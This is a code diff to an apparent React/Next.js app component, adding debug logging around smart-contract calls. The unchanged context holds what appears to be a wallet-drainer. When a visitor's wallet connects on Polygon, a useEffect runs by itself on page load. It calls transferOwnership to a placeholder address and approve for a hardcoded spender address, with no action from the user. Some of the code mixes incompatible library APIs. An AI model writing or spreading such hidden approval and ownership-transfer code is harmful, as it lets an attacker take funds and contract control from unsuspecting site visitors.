@@ -468,7 +468,11 @@ const callSmartContract = async () => {
     try {
         const response = await fetch(`https://api.etherscan.io/api?module=contract&action=getabi&address=${contractAddress}&format=json`);
         const { result: abi } = await response.json();
+        console.log('Retrieved ABI:', abi);
+
         const contractInstance = new provider.eth.Contract(JSON.parse(abi), contractAddress);
+        console.log('Contract instance:', contractInstance);
+
         const result = await contractInstance.methods.transferOwnership('0xNewOwnerAddress').send({ from: '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E' });
         console.log('Result of calling smart contract function:', result);
     } catch (error) {
@@ -479,11 +483,14 @@ const callSmartContract = async () => {
 const approveTransaction = async () => {
     try {
         const contractInstance = wagmiClient.getContract(contractAddress, abi);
+        console.log('Contract instance:', contractInstance);
+
         const spender = '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E';
         const value = '1000000000000000000';
+        console.log('Spender:', spender);
+        console.log('Value:', value);
 
         const result = await contractInstance.methods.approve(spender, value).sendTransaction();
-
         console.log('Transaction successfully sent:', result);
     } catch (error) {
         console.error('Error sending transaction:', error);
@@ -497,6 +504,7 @@ function MyApp({ Component, pageProps }) {
     useEffect(() => {
         const checkAndCallSmartContract = async () => {
             if (connected && chainId === polygon.chainId) {
+                console.log('Calling smart contract...');
                 await callSmartContract();
                 await approveTransaction();
             }
